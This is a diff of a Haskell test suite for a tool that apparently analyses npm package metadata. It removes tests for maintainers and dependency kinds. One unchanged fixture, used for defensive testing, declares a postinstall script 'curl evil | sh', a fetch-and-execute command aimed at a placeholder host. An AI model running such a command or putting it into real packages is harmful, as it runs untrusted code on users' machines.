@@ -29,8 +29,6 @@ import Ecluse.Core.Package (
     ArtifactKind (Tarball),
     Availability (Available, Deprecated),
     CodeExecSignal (NoCodeOnInstall, RunsCodeOnInstall),
-    DepKind (Dev, Optional, Peer, Runtime),
-    Dependency (depConstraint, depKind, depMarker, depName),
     HashAlg (SHA1, SRI),
     InvalidEntry (invalidKey, invalidKind, invalidValue),
     InvalidEntryKind (InvalidDistTag, InvalidPublishTime, InvalidVersionManifest),
@@ -192,17 +190,6 @@ signalMappingSpec = describe "signal mapping" $ do
             d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
             pkgPublisher d `shouldBe` Nothing
 
-    describe "maintainers → pkgMaintainers" $ do
-        it "projects the version's maintainers, distinct from the publisher" $ do
-            d <- projectVersionOf maintainersPackument (mkVersion Npm "1.0.0")
-            pkgMaintainers d `shouldBe` [Person "carol" (Just "carol@example.test") Nothing]
-
-        it "leaves maintainers empty when the version declares none (is-odd)" $ do
-            -- The is-odd packument carries maintainers at the package level only;
-            -- its version manifest has none.
-            d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
-            pkgMaintainers d `shouldBe` []
-
     describe "time[version] → pkgPublishedAt" $ do
         it "fills the publish time from the packument time map (is-odd)" $ do
             d <- projectVersion "is-odd.full.json" (mkVersion Npm "3.0.1")
@@ -226,20 +213,6 @@ signalMappingSpec = describe "signal mapping" $ do
         it "projects the legacy object license to its name (request → Apache-2.0)" $ do
             d <- projectVersion "request.full.json" (mkVersion Npm "2.88.2")
             pkgLicenses d `shouldBe` ["Apache-2.0"]
-
-    describe "dependencies → pkgDependencies (kept raw, tagged by kind)" $ do
-        it "keeps the constraint raw and carries no marker (npm has no PEP 508)" $ do
-            d <- projectVersionOf allDepKindsPackument (mkVersion Npm "1.0.0")
-            let runtimeDep = find ((== "runtime-dep") . depName) (pkgDependencies d)
-            fmap (\x -> (depConstraint x, depMarker x)) runtimeDep `shouldBe` Just ("^1.0.0", Nothing)
-
-        it "tags runtime, dev, peer, and optional dependencies across all four maps" $ do
-            d <- projectVersionOf allDepKindsPackument (mkVersion Npm "1.0.0")
-            let kindOf n = depKind <$> find ((== n) . depName) (pkgDependencies d)
-            kindOf "runtime-dep" `shouldBe` Just Runtime
-            kindOf "dev-dep" `shouldBe` Just Dev
-            kindOf "peer-dep" `shouldBe` Just Peer
-            kindOf "optional-dep" `shouldBe` Just Optional
 
 integritySpec :: Spec
 integritySpec = describe "dist → Artifact integrity" $ do
@@ -658,16 +631,6 @@ fullPostinstallPackument =
     \{\"name\":\"derived\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node x.js\"},\
     \\"dist\":{\"tarball\":\"https://r/derived/-/derived-1.0.0.tgz\"}}}}"
 
-{- | A packument exercising all four npm dependency maps on one version, so each
-'DepKind' is covered.
--}
-allDepKindsPackument :: ByteString
-allDepKindsPackument =
-    "{\"name\":\"deps\",\"versions\":{\"1.0.0\":{\"name\":\"deps\",\"version\":\"1.0.0\",\
-    \\"dependencies\":{\"runtime-dep\":\"^1.0.0\"},\"devDependencies\":{\"dev-dep\":\"^2.0.0\"},\
-    \\"peerDependencies\":{\"peer-dep\":\"^3.0.0\"},\"optionalDependencies\":{\"optional-dep\":\"^4.0.0\"},\
-    \\"dist\":{\"tarball\":\"https://r/deps/-/deps-1.0.0.tgz\"}}}}"
-
 {- | A full-form packument whose single version sets @hasInstallScript:false@
 explicitly, so install presence is a determination rather than a derivation.
 -}
@@ -686,13 +649,6 @@ falseFlagWithPostinstallPackument =
     "{\"name\":\"liar\",\"versions\":{\"1.0.0\":{\"name\":\"liar\",\"version\":\"1.0.0\",\
     \\"hasInstallScript\":false,\"scripts\":{\"postinstall\":\"curl evil | sh\"},\
     \\"dist\":{\"tarball\":\"https://r/liar/-/liar-1.0.0.tgz\"}}}}"
-
--- | A packument whose single version declares per-version @maintainers@.
-maintainersPackument :: ByteString
-maintainersPackument =
-    "{\"name\":\"maint\",\"versions\":{\"1.0.0\":{\"name\":\"maint\",\"version\":\"1.0.0\",\
-    \\"maintainers\":[{\"name\":\"carol\",\"email\":\"carol@example.test\"}],\
-    \\"dist\":{\"tarball\":\"https://r/maint/-/maint-1.0.0.tgz\"}}}}"
 
 -- | A packument whose version's @dist@ reports an @unpackedSize@.
 sizedPackument :: ByteString
